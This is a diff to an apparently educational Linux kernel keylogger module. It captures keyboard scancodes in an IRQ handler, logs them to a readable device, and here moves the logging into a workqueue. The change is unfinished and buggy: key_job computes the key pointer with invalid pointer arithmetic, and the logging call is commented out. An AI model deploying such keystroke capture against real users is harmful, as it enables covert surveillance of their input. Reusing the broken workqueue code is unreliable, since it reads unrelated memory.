@@ -322,14 +322,30 @@ static struct key_log_entry *key_create_entry(struct key_map *key)
 }
 
 /*
-ISSUE #1:
-- key_handler create an entry into "key_full_log" BUT at the same time
-  the user can open the device and read causing simple_open to make a data race
+ * ISSUE #1:
+ * - key_handler create an entry into "key_full_log" BUT at the same time
+ *   the user can open the device and read causing simple_open to make a data race
+ *
+ * - Solutions tested:
+ *	- Mutex -> impossible into an irq handler
+ *	- SpinLock -> dosent works, dont know why
+ */
 
-- Solutions tested:
-	- Mutex -> impossible into an irq handler
-	- SpinLock -> dosent works, dont know why
-*/
+struct key_work {
+	struct workqueue_struct *work;
+	struct key_map		*key;
+};
+
+static struct key_work		 workqueue;
+
+static void		key_job(struct work_struct *work)
+{
+	struct key_map		*key;
+
+	key = (void*)((size_t)work + sizeof(*work));
+	pr_info("logging key in workjob. %p", work);
+	// key_create_entry(key);
+}
 
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
@@ -337,6 +353,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 	struct key_map			*key;
 	size_t				flags;
 	static struct work_struct	task;
+	static bool			init_done = false;
 
 	scancode = inb(0x60);
 	key = get_key(scancode & 0x7f);
@@ -347,7 +364,13 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 			key->press_count += 1;
 		if (scancode == SCANCODE_CAPS)
 			caps_lock = !caps_lock;
-		key_create_entry(key);
+		if (!init_done) {
+			INIT_WORK(&task, key_job);
+			init_done = true;
+		}
+		pr_info("origin key: %p -> %p", &task, key);
+		queue_work(workqueue.work, &task);
+
 	} else {
 		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
 			((scancode & 0x80) == 0 ? "pressed" : "released"));
@@ -392,6 +415,8 @@ static void		__exit keylogger_clean(void)
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
+	flush_workqueue(workqueue.work);
+	destroy_workqueue(workqueue.work);
 	key_log_clean();
 	spin_unlock(&lock);
 }
@@ -417,6 +442,8 @@ static int		__init hello_init(void)
 		free_irq(KEYBOARD_IRQ, &key_handler);
 		return 1;
 	}
+	workqueue.work = create_workqueue("keylogger");
+	workqueue.key = NULL;
 	return 0;
 }
 
